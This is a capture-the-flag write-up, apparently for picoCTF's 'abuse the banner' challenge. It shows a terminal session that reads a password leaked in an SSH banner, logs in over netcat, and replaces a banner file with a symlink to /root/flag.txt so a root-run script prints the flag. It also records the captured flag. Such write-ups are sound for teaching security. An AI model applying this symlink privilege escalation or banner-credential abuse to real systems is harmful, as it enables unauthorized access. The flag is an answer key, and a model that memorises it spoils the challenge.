#### Descripción 
Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 54429`. Use the leaked information to get to the server.

To connect to the running application use `nc tethys.picoctf.net 54275`. From the above information abuse the machine and find the flag in the /root directory.
#### Solución
```
rosyperez@MacBookAir GeneralSkills % nc tethys.picoctf.net 54429

SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
rosyperez@MacBookAir GeneralSkills % nc tethys.picoctf.net 54275         
*************************************
**************WELCOME****************
*************************************

what is the password? 

My_Passw@rd_@1234
player@challenge:/$ ls
ls
bin   challenge  etc   lib    media  opt   root  sbin  sys  usr
boot  dev        home  lib64  mnt    proc  run   srv   tmp  var
player@challenge:/$ cat /root/script.py  
cat /root/script.py
import os
import pty
incorrect_ans_reply = "Lol, good try, try again and good luck\n"
if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")
  
try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))
                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break
except:
    KeyboardInterrupt
player@challenge:/$ rm /home/player/banner
rm /home/player/banner
player@challenge:/$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:/$ ^C
rosyperez@MacBookAir GeneralSkills % nc tethys.picoctf.net 54275
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
what is the password? 

rosyperez@MacBookAir GeneralSkills %
```
#### Notas
la respuesta está en como funciona el banner ya que no se cuenta con los permisos de ver la flag pero si la ponemos en el banner si
#### Referencias